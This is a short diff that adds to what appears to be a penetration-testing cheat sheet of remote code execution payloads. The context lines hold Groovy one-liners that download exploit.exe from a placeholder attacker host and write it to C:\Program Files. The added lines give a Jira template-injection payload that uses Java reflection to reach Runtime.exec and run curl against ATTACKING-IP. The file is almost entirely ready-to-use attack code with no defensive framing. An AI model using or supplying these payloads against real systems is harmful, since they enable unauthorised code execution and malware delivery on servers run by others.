@@ -97,3 +97,10 @@ def url = 'http://ATTACKING-IP/exploit.exe';def file = new File('C:\\Program Fil
 (or)
 def url = 'file://ATTACKING-IP//public//exploit.exe';def file = new File('C:\\Program Files\\exploit.exe').newOutputStream();file << new URL(url).openStream();file.close()
 
+---------------------------------------------------------------------------------------------------------------------------------------
+
+# Jira:
+
+$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://ATTACKING-IP/public').waitFor()
+
+---------------------------------------------------------------------------------------------------------------------------------------
